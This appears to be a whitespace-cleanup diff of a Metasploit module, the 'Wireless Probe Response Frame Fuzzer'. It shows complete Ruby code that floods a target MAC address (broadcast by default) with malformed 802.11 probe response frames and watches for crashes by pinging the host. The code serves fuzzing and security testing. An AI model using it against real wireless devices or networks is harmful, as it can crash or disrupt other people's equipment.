@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -19,12 +19,12 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Auxiliary::Dos
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Wireless Probe Response Frame Fuzzer',
 			'Description'    => %q{
 				This module sends out corrupted probe response frames.
 			},
-			
+
 			'Author'         => [ 'hdm' ],
 			'License'        => MSF_LICENSE,
 			'Version'        => '$Revision$'
@@ -32,8 +32,8 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system",'FF:FF:FF:FF:FF:FF']),
-				OptString.new('PING_HOST', [ false,  "Ping the wired address of the target host"])			
-			], self.class)					
+				OptString.new('PING_HOST', [ false,  "Ping the wired address of the target host"])
+			], self.class)
 	end
 
 	def ping_check
@@ -46,24 +46,24 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		return false
 	end
-	
+
 	def run
-		
+
 		srand(0)
-		
+
 		@@uni = 0
-		
+
 		frames = []
-	
+
 		open_wifi
-		
+
 		print_status("Sending corrupt frames...")
-		
+
 		while (true)
 			frame = create_frame()
-			
+
 			if (datastore['PING_HOST'])
-			
+
 				if (frames.length >= 5)
 					frames.shift
 					frames.push(frame)
@@ -71,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
 					frames.push(frame)
 				end
 
-				1.upto(10) do 
+				1.upto(10) do
 					wifi.write(frame)
 					if (not ping_check())
 						frames.each do |f|
@@ -79,9 +79,9 @@ class Metasploit3 < Msf::Auxiliary
 							print_status f.inspect
 						end
 						return
-					end		
+					end
 				end
-			else 
+			else
 				wifi.write(frame)
 			end
 		end
@@ -93,30 +93,30 @@ class Metasploit3 < Msf::Auxiliary
 
 		bssid    = Rex::Text.rand_text(6)
 		seq      = [rand(255)].pack('n')
-		
-		frame = 
+
+		frame =
 			"\x50" +                      # type/subtype
 			"\x00" +                      # flags
-			"\x00\x00" +                  # duration  
+			"\x00\x00" +                  # duration
 			eton(datastore['ADDR_DST']) + # dst
 			bssid +                       # src
 			bssid +                       # bssid
-			seq   +                       # seq  
+			seq   +                       # seq
 			Rex::Text.rand_text(8) +      # timestamp value
 			Rex::Text.rand_text(2) +      # beacon interval
 			Rex::Text.rand_text(2)        # capability flags
-		
+
 		ssid = Rex::Text.rand_text_alphanumeric(rand(256))
 
 		# ssid tag
 		frame << "\x00" + ssid.length.chr + ssid
 
 		# supported rates
-		frame << "\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48" 
-		
+		frame << "\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48"
+
 		# current channel
 		frame << "\x03" + "\x01" + channel.chr
-	
+
 		1.upto(ies) do |i|
 			max = mtu - frame.length
 			break if max < 2
@@ -125,9 +125,9 @@ class Metasploit3 < Msf::Auxiliary
 			d = Rex::Text.rand_text(l)
 			frame += t.chr + l.chr + d
 		end
-		
+
 		return frame
 
 	end
-	
+
 end
